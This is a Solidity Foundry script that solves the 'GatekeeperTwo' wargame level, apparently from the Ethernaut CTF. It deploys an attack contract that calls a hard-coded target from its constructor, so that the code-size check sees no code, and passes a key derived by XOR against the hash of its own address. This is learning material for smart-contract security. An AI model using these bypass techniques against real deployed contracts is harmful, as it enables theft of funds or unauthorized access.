// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";
import {Script, console} from "forge-std/script.sol";

contract GatekeeperTwoSolution is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack();
        vm.stopBroadcast();
    }
}

contract Attack {
    GatekeeperTwo gateKeeper = GatekeeperTwo(0x634A01933be30851897414Ef2B1c642A69818fd3);

    uint64 max = type(uint64).max;
    uint64 hash = uint64((bytes8(keccak256(abi.encodePacked(address(this))))));
    bytes8 key = bytes8(max ^ hash);

    constructor() {
        gateKeeper.enter(key);
    }
}

/*
(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)

k = (bytes8(keccak256(abi.encodePacked(msg.sender)) ====> 
uint64 k ^ uint64(_gateKey) == type(uint64).max


*/
